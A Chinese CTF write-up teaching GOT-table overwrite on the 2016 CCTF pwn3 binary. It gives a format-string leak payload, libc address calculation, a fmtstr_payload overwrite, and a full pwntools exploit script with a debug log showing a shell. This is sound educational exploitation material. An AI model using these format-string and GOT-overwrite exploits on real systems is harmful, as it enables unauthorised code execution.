> 附件：
>
> 链接：[https://pan.baidu.com/s/1H9AVH4wXct8gxkf9GV0YWA](https://pan.baidu.com/s/1H9AVH4wXct8gxkf9GV0YWA)
>
> 提取码：140h
>
> 例题：2016-CCTF-pwn3
>

# 原理
现在的C程序中，libc的函数是通过GOT表来实现跳转的。在没有开启RELRO（或开启Partial RELRO）保护的前提下，每个libc的函数对应的GOT表项是可以被修改的。因此修改某个libc函数的GOT表内容为另一个libc函数的地址来实现对程序的控制。

假设我们将函数A的地址覆盖为函数B的地址，那么这一攻击技巧可以分为以下步骤

+ 确定函数A的GOT表地址
    - 主要利用函数A一般在程序中已有，所以可以采用简单的寻找地址的方法来找
+ 确定函数B的内存地址
    - 需要想办法泄露对应函数B的地址
+ 将函数B的内存写入到函数A的GOT表地址处
    - 需要利用函数的漏洞来触发
        * 写入函数：write函数
        * ROP
            + `pop eax; ret; # printf@got -> eax`
            + `pop ebx; ret; # (addr_offset = system_addr - printf_addr) -> ebx`
            + `add [eax] ebx; ret; # [printf@got] = [printf@got] + addr_offset`
        * 格式化字符串任意地址写

# 示例
将文件下载下来，检查一下文件的保护情况：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1597987510600-11228009-e985-4028-a2b9-ed5c42e3792e.png)

32为程序，只开启了NX（栈不可执行保护）

## 查看程序的执行流程
将文件扔到IDA中，查看程序的流程：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1597987640759-53777bd0-a7a9-48bd-8d03-7a85913a4541.png)

进入查看ask_username函数（更改ask函数的类型为void，因为此函数明显没有返回值）：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1597987741594-df5264ff-6a20-4c40-99bc-937d2ba685f2.png)

可以看到，这个函数将我们输入的src进行了每一位+1变换；比如我们输入的是abc，那么变换之后的内容就是bcd。

然后将变换后的src变量copy给dest变量（也就是main函数的s1变量）。

> 注：ask_username的传参方式为char *dest，这种传参方式就导致了main函数的s1变量的变化
>

进入查看ask_password函数（仍然将函数的类型改为void）

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1597988095810-3a15df4b-c4d0-4ebd-a00e-dc7345678cc6.png)

可以看到，这个函数检查的是我们在ask_username输入的内容，由于有strcmp函数的存在，因此我们可以反推我们要输入正确的内容是“rxraclhm”。输入正确之后进入第二层while循环，print_prompt()如下：（类型改为void）

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1597988326182-b3f0b4e9-1c63-47bf-9891-eb7a7f917be5.png)

进入get_command()函数：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1597988380387-1a7202b6-c2cd-4943-8eed-f5fd3f5ccc91.png)

可以看到这里让我们输入命令来控制程序的流程，并将返回值返回到main函数的v3。

进入main函数查看put_file()函数（改为void）：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1597988751650-07322715-eb61-4816-848c-a8243f13eef7.png)

这个函数进行了两次的输入，具体流程就不用管了，这又不是逆向，你说对吧？

查看show_dir()（还是改为void）

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1597989260800-9587b658-21b5-4980-99e7-0aa17937f937.png)

看一下伪代码，emmm，不想看，运行一下程序就知道了：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1597989338367-4866a292-b920-4696-8c20-537f83a29358.png)

得出这个函数的作用：将我们输入的文件名全部打印出来。

看一下最后一个函数（改为void类型）：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1597989636718-1bf36d73-a21d-4f36-a779-6bf391e76f43.png)

> 注意：这个函数的s1和main函数中的不一样，从他们的栈空间就可以知道不相同。
>

这个函数会有一次输入，让我们选择要打印的文件名称，并且打印出我们输入的文件内容，并且能够在最后看到很明显的格式化字符串漏洞（printf(&dest)）

## getshell的思路
看完了这些函数的功能之后，就得思考怎么getshell；从IDA中我们可以很清晰的看到：没有system函数，没有'/bin/sh'字符串。那么尝试一下leak（泄露）libc。

从上面的函数流程可以看到，除了有一个格式化字符串漏洞，其他地方基本上都是完美的。

那么我们就用printf函数来泄露出函数的真实地址。

### 确定格式化字符串偏移
首先我们使用IDA查看一下会造成危险的printf地址：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1597997208690-c4a4caa0-b895-47f0-bd46-eb0ba46f55e3.png)

其地址为：0x0804889E

接下来在Linux中使用pwngdb进行调试，在0x0804889E处下断点，执行程序：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1597997509009-0534127a-9214-4371-a877-0f15b98610c9.png)![](https://cdn.nlark.com/yuque/0/2020/png/574026/1597997510131-b1f04986-d037-4897-a784-06cd4462275f.png)

解释一下上图的过程：

下完断点之后我们还需要做一些工作才能够实现效果：首先输入登录密码进入，输入”put“调用put_file函数执行录入功能，首先输入文件名“Cyberangel”（我自己的名字，你愿意输入啥都行），接着输入我们的测试字符串“AAAA%p%p%p%p%p%p%p%p%p%p%p%p”，然后输入“get“调用get_file函数执行打印功能，输入“Cyberangel”也就是我们刚才创建的文件名，回车之后程序就会停在printf函数处。

我们看一下栈上的情况：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1597997732190-3087892b-4b5a-4ee4-bc60-dc3557adb42b.png)

输入c继续执行程序，看它会输出什么：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1597997978515-a160eca6-2e4b-402d-9e50-a0dd57c93b60.png)

很容易得到我们输入的字符串偏移为7。

### 泄露puts函数地址
我们知道了字符串的偏移为7，剩下的只要知道puts@got地址就可以了。这很好办，交给pwntools中的elf模块就可以了，所以构建的payload如下：

```python
payload = '%8$s' + p32(puts_got)
```

> %s：输出的内容是字符串，即将偏移处指针指向的字符串输出，如%i$s表示输出偏移i处地址所指向的字符串，在32bit和64bit环境下一样，可用于读取GOT表等信息。
>

我们将%s放在第7位，puts@got放在第8位，这样%8$s就会把puts函数的真实地址打印出来了。为什么要这样布置呢，其实是为了方便接收打印出来的字符串。**<font style="color:#F5222D;">这样布置后puts函数的真实地址会在前4个字节打出来，所以只需要接收前四个就可以了。</font>**

> 当然你也可以选择：payload = p32(puts_got) + '%7$s'
>
> 这种方式，不过打印出来的内容需要**<font style="color:#F5222D;">从第5个字节开始接收</font>**
>



就这样，我们使用printf加上'%8$s'就打印出了程序运行时puts函数的真实地址（打印出前4个字节）

再使用pwntools中的recv()[:4]接受一下就ok了。

```python
puts_addr = u32(sh.recv()[:4]) 
```

### 找system函数地址
由于我们使用的是本地的libc，所以挂载本地的libc就行了。查看一下程序在运行时使用的libc文件：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1597998871640-3125a9aa-d28b-452d-8734-7816e2aef49c.png)

> 如果是远程的话，在上面我们已经知道了puts函数的真实地址，查找一下libc所对应的版本就行了
>

从上图可以看到真正用到的是”/lib/i386-linux-gnu/libc.so.6“这个库，所以把这个库载入进来就可以了：

```python
libc=ELF('/lib/i386-linux-gnu/libc.so.6')
libc.address = puts_addr - libc.symbols['puts']
sys_addr=libc.symbols['system']
```

### 覆盖puts函数
我们之前已经用过了puts_file函数和get_file函数，接下来就该使用show_dir函数了。

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1597989260800-9587b658-21b5-4980-99e7-0aa17937f937.png)

基本思路是这样的：

回顾一下show_dir函数，这个函数会将我们输入的文件名存放在变量s中，最后会作为puts函数的参数打印出来。**<font style="color:#F5222D;">那么如果将puts函数替换成system函数，并且我们创建一个叫"/bin/sh"的文件名，那么原本应该执行的是puts(s)，但实际上执行的却是system("/bin/sh")</font>**，前期都是准备工作，拿shell才是终极目的！！！

那么覆盖的过程依然利用格式化字符串进行覆盖，这里介绍一下pwntools中的一个函数fmtstr_payload

#### fmtstr_payload
![](https://cdn.nlark.com/yuque/0/2020/png/574026/1597999323723-05eb935a-4375-4436-90bf-32b36e94c4d3.png)

这个函数主要的用途就是利用格式化字符串漏洞覆盖某处地址，所以我们的覆盖payload就可以这样写：

```python
payload = fmtstr_payload(7, {puts_got: sys_addr})
```

> 7：距离格式化字符串的偏移
>
> puts_got：被覆盖的地址
>
> sys_addr：覆盖的地址
>

### 执行dir拿shell
在覆盖之后紧接着就可以输入dir调用show_dir函数，原本的puts("/bin/sh;")就会转而执行system("/bin/sh;")，然后就可以getshell了.

> 为什么/bin/sh后面会有一个分号？
>
> 因为system函数调用的时候是这样的system("/bin/sh;")，所以为了能够执行成功，所以加了一个分号
>

## 回顾思路
输入密码 --> 输入put创建文件 --> 输入文件名"/bin/sh;" --> 输入文件内容（覆盖的payload）–> 输入get打印文件内容 --> 输入要打印的文件名"/bin/sh;"执行覆盖

# exp
```python
# -*- coding: UTF-8 -*-
from pwn import *
context.log_level = 'debug'

sh = process('./pwn3')
pwn3 = ELF('./pwn3')
sh.recvuntil('Name (ftp.hacker.server:Rainism):')
#登录密码：rxraclhm
sh.sendline('rxraclhm')
#通过puts函数把部署好的泄露任意地址的payload写进去
puts_got = pwn3.got['puts']
sh.sendline('put')
sh.recvuntil('please enter the name of the file you want to upload:')
sh.sendline('Cyberangel')
sh.recvuntil('then, enter the content:')
payload='%8$s' + p32(puts_got)
sh.sendline(payload)
#通过get泄露puts函数地址
sh.sendline('get')
sh.recvuntil('enter the file name you want to get:')
sh.sendline('Cyberangel')
puts_addr = u32(sh.recv()[:4])
#从库中找到system函数地址
libc = ELF ('/lib/i386-linux-gnu/libc.so.6')
libc.address = puts_addr - libc.symbols['puts']
sys_addr=libc.symbols['system']
#将第七个参数的puts函数地址改成system函数地址
payload = fmtstr_payload(7, {puts_got: sys_addr})
sh.sendline('put')
sh.recvuntil('please enter the name of the file you want to upload:')
#在运行show_dir时将puts(”/bin/sh;“)变成system("/bin/sh;"),并成功获取shell
sh.sendline('/bin/sh;')
sh.recvuntil('then, enter the content:')
sh.sendline(payload)
#通过get打印‘/bin/sh;’文件，执行system('/bin/sh;')
sh.recvuntil('ftp>')
sh.sendline('get')
sh.recvuntil('enter the file name you want to get:')
sh.sendline('/bin/sh;')
#通过dir来拿到shell
sh.sendline('dir')
sh.interactive()
```

debug日志如下：

```python
ubuntu@ubuntu:~/Desktop$ python 1.py
[+] Starting local process './pwn3' argv=['./pwn3'] : pid 6264
[DEBUG] PLT 0x80484a0 setbuf
[DEBUG] PLT 0x80484b0 strcmp
[DEBUG] PLT 0x80484c0 printf
[DEBUG] PLT 0x80484d0 bzero
[DEBUG] PLT 0x80484e0 fread
[DEBUG] PLT 0x80484f0 strcpy
[DEBUG] PLT 0x8048500 malloc
[DEBUG] PLT 0x8048510 puts
[DEBUG] PLT 0x8048520 __gmon_start__
[DEBUG] PLT 0x8048530 exit
[DEBUG] PLT 0x8048540 __libc_start_main
[DEBUG] PLT 0x8048550 __isoc99_scanf
[DEBUG] PLT 0x8048560 strncmp
[*] '/home/ubuntu/Desktop/pwn3'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[DEBUG] Received 0x70 bytes:
    'Connected to ftp.hacker.server\n'
    '220 Serv-U FTP Server v6.4 for WinSock ready...\n'
    'Name (ftp.hacker.server:Rainism):'
[DEBUG] Sent 0x9 bytes:
    'rxraclhm\n'
[DEBUG] Sent 0x4 bytes:
    'put\n'
[DEBUG] Received 0x42 bytes:
    'welcome!\n'
    'ftp>please enter the name of the file you want to upload:'
[DEBUG] Sent 0xb bytes:
    'Cyberangel\n'
[DEBUG] Received 0x18 bytes:
    'then, enter the content:'
[DEBUG] Sent 0x9 bytes:
    00000000  25 38 24 73  28 a0 04 08  0a                        │%8$s│(···│·│
    00000009
[DEBUG] Sent 0x4 bytes:
    'get\n'
[DEBUG] Received 0x28 bytes:
    'ftp>enter the file name you want to get:'
[DEBUG] Sent 0xb bytes:
    'Cyberangel\n'
[DEBUG] Received 0x20 bytes:
    00000000  b0 7c da f7  26 85 04 08  36 85 04 08  50 05 d6 f7  │·|··│&···│6···│P···│
    00000010  d0 40 da f7  e0 43 e8 f7  28 a0 04 08  66 74 70 3e  │·@··│·C··│(···│ftp>│
    00000020
[DEBUG] PLT 0x176b0 _Unwind_Find_FDE
[DEBUG] PLT 0x176c0 realloc
[DEBUG] PLT 0x176e0 memalign
[DEBUG] PLT 0x17710 _dl_find_dso_for_object
[DEBUG] PLT 0x17720 calloc
[DEBUG] PLT 0x17730 ___tls_get_addr
[DEBUG] PLT 0x17740 malloc
[DEBUG] PLT 0x17748 free
[*] '/lib/i386-linux-gnu/libc.so.6'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[DEBUG] Sent 0x4 bytes:
    'put\n'
[DEBUG] Received 0x35 bytes:
    'please enter the name of the file you want to upload:'
[DEBUG] Received 0x4 bytes:
    'ftp>'
[DEBUG] Sent 0x4 bytes:
    'get\n'
[DEBUG] Received 0x24 bytes:
    'enter the file name you want to get:'
[DEBUG] Sent 0x9 bytes:
    '/bin/sh;\n'
[DEBUG] Sent 0x4 bytes:
    'dir\n'
[*] Switching to interactive mode
[DEBUG] Received 0x10e bytes:
    00000000  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
    *
    00000020  20 20 20 20  20 20 20 20  20 20 20 20  30 20 20 20  │    │    │    │0   │
    00000030  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
    *
    000000a0  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 04  │    │    │    │   ·│
    000000b0  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
    *
    000000d0  20 20 20 20  20 20 20 3e  20 20 20 20  20 20 20 20  │    │   >│    │    │
    000000e0  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
    000000f0  20 20 20 20  20 20 47 61  61 61 29 a0  04 08 28 a0  │    │  Ga│aa)·│··(·│
    00000100  04 08 2a a0  04 08 2b a0  04 08 66 74  70 3e        │··*·│··+·│··ft│p>│
    0000010e
                                            0                                                                                                                                  \x04                                      >                              Gaaa)\xa0\x04(\xa0\x04*\xa0\x04+\xa0\x04ftp>$ ls
[DEBUG] Sent 0x3 bytes:
    'ls\n'
[DEBUG] Received 0x31 bytes:
    '1.py  edb  Link to edb\tpwn3  pwndbg-dev  smashes\n'
1.py  edb  Link to edb    pwn3  pwndbg-dev  smashes
$ whoami
[DEBUG] Sent 0x7 bytes:
    'whoami\n'
[DEBUG] Received 0x7 bytes:
    'ubuntu\n'
ubuntu
$  
```

getshell！

